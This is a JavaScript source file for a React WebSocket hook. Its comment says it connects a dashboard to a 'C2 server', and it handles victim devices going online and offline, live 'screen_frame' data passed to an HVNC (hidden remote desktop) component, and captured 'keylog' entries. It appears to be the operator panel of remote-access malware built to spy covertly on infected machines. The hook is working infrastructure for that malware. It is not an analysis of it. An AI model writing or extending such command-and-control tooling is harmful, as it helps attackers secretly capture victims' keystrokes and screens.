import { useEffect, useRef, useCallback } from 'react';
import { useStore } from '../lib/store.js';

/**
 * WebSocket hook — connects to the C2 server, handles reconnection,
 * and dispatches events to the Zustand store.
 */
export function useWS() {
  const wsRef = useRef(null);
  const reconnectTimerRef = useRef(null);
  const mountedRef = useRef(true);

  const token = useStore(s => s.token);
  const setWsConnected = useStore(s => s.setWsConnected);
  const updateDevice = useStore(s => s.updateDevice);
  const setKeylogs = useStore(s => s.setKeylogs);
  const appendKeylog = useStore(s => {
    // Append to keylogs array, keep last 200
    const fn = (entry) => {
      s.setKeylogs([entry, ...s.keylogs.slice(0, 199)]);
    };
    return fn;
  });

  const connect = useCallback(() => {
    if (!token) return;
    if (wsRef.current?.readyState === WebSocket.OPEN) return;

    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const host = window.location.host;
    const url = `${protocol}//${host}/ws`;

    try {
      const ws = new WebSocket(url);
      wsRef.current = ws;

      ws.onopen = () => {
        console.log('[WS] Connected');
        setWsConnected(true);

        // Authenticate
        ws.send(JSON.stringify({
          type: 'auth',
          token,
          device: { type: 'dashboard' },
        }));
      };

      ws.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data);

          switch (msg.type) {
            case 'auth_ok':
              console.log('[WS] Authenticated as dashboard');
              break;

            case 'auth_error':
              console.error('[WS] Auth failed:', msg.message);
              ws.close();
              break;

            case 'device_online':
              updateDevice(msg.deviceId, { is_online: 1 });
              break;

            case 'device_offline':
              updateDevice(msg.deviceId, { is_online: 0 });
              break;

            case 'screen_frame':
              // Forward to HVNC component via custom event
              window.dispatchEvent(
                new CustomEvent('screen_frame', {
                  detail: { deviceId: msg.deviceId, data: msg.data, timestamp: msg.timestamp },
                })
              );
              break;

            case 'keylog':
              if (appendKeylog) appendKeylog(msg);
              break;

            case 'pong':
              // Heartbeat response, nothing to do
              break;

            default:
              break;
          }
        } catch (err) {
          console.error('[WS] Parse error:', err);
        }
      };

      ws.onclose = () => {
        console.log('[WS] Disconnected');
        setWsConnected(false);
        wsRef.current = null;

        // Reconnect after delay
        if (mountedRef.current) {
          reconnectTimerRef.current = setTimeout(connect, 3000);
        }
      };

      ws.onerror = (err) => {
        console.error('[WS] Error:', err);
        ws.close();
      };
    } catch (err) {
      console.error('[WS] Connection failed:', err);
      if (mountedRef.current) {
        reconnectTimerRef.current = setTimeout(connect, 5000);
      }
    }
  }, [token, setWsConnected, updateDevice, appendKeylog]);

  const send = useCallback((data) => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(data));
    }
  }, []);

  useEffect(() => {
    mountedRef.current = true;
    if (token) connect();

    return () => {
      mountedRef.current = false;
      if (reconnectTimerRef.current) clearTimeout(reconnectTimerRef.current);
      if (wsRef.current) {
        wsRef.current.onclose = null;
        wsRef.current.close();
      }
    };
  }, [token, connect]);

  return { send, isConnected: () => wsRef.current?.readyState === WebSocket.OPEN };
}
